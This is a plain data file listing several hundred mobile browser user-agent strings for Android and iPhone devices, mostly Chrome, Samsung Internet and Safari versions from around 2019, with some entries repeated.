Mozilla/5.0 (Linux; Android 8.1.0; SM-J260F Build/M1AJB; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 SamsungBrowser/7.2 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SM-A510F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; SM-E700H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.4; GT-I9060I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; General Mobile 4G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53
Mozilla/5.0 (Linux; Android 8.0.0; MI 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; POT-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 8.0.0; SM-C5000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; GM 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0; E5303) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-E500H Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; U; Android 4.1.2; tr-tr; GT-I8190 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30
Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-A510F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SM-G920F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; LDN-L01) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Android 6.0.1; Mobile; rv:66.0) Gecko/66.0 Firefox/66.0
Mozilla/5.0 (Linux; Android 9; SM-M205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-N920C Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; Redmi 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SM-G920F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; SAMSUNG SM-J415F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-G920F Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.1.1; GM 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; LG-M250) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.80 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 6.0; LG-H542 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.2125.102 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 8.0.0; GM 5 Plus d) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.1.1; GM 5 d) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 7.0; Venus_V4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36
Mozilla/5.0 (Android 6.0; Mobile; rv:68.0) Gecko/68.0 Firefox/68.0
Mozilla/5.0 (Linux; Android 9; ANE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-A500F Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0; LG-H815 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.2125.102 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.0; SM-N900) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J701F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 5.1.1; SM-J120F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SM-G925F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; ANE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; G3221) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) CriOS/75.0.3770.103 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 6.0.1; LG-K500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.1; ALE-L21 Build/HuaweiALE-L21) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J730F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.4 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-N920C Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.1; GT-I9500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; SM-J500F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.1.2; GT-I8190 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.2; LG-D690) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; MI 5s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J701F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.4; SAMSUNG SM-J110H Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; SM-G611F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/78.0.257670029 Mobile/16B92 Safari/604.1
Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SM-G955F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; SM-G935F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; Venus_V3_5010 Build/VDL371; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/51.0.2704.81 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-A800I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 8.1.0; GM8 go) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.1.2; Venus V5 Build/VTE1040; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.3683.90 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; MI 8 Lite Build/PKQ1.181007.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.0; SM-N9000Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0; PLK-L01) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/75.0.3770.103 Mobile/15E148 Safari/605.1
Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-A310F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36 
Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-A720F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; MI 5s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; Vodafone Smart ultra 6 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 9; MRD-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0; LG-K430) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.1.1; SM-J510FQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SNE-LX1 Build/HUAWEISNE-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0; LG-H815 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.2125.102 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 9; ANE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-N910C Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 7.0; Lenovo P2a42) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-N920C Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SM-G920F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; U; Android 4.1.2; tr-tr; GT-I8190 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30
Mozilla/5.0 (Linux; Android 5.1.1; SM-J200F Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-A505F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-J700F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; GM 6 d) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SM-J701F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.1.1; General Mobile 4G Dual) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.0 Mobile/14G60 Safari/602.1
Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-E500H Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; FIG-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/75.0.3770.103 Mobile/15E148 Safari/605.1
Mozilla/5.0 (Linux; Android 9; FIG-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; Mi A2 Lite Build/PKQ1.180917.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.2.2; GT-I9060) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; Venus_V3_5010 Build/VDL371; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/51.0.2704.81 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 CriOS/75.0.3770.100 Mobile/15E148 Safari/605.1
Mozilla/5.0 (iPhone; CPU iPhone OS 9_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) FxiOS/8.3b5826 Mobile/13C75 Safari/601.1
Mozilla/5.0 (Linux; Android 6.0.1; SM-J710F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; Vestel_5000_2gb) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.2; SM-G355HQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; SM-A320F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; SM-J200F Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; GM 8 d) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; Venus_V3_5010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Version/10.0 Mobile/14F89 Safari/602.1
Mozilla/5.0 (Linux; Android 5.0; SM-N9000Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.2; SM-T210) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; ANE-LX1 Build/HUAWEIANE-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; SM-C9000 Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-N920C Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 8.0.0; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; SM-A720F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0; 7070X Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.1.1; VFD 710) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 9; ANE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SM-N920C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-J500F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900 Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D100 Safari/604.1
Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.0 Mobile/14G60 Safari/602.1
Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SM-A750F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.1.1; Moto E (4) Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; MI 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; RNE-L01 Build/HUAWEIRNE-L01; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; G3221) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-A720F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53
Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-N910C Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.0; E2303) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.1; GT-I9500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; AMN-LX9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-A720F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
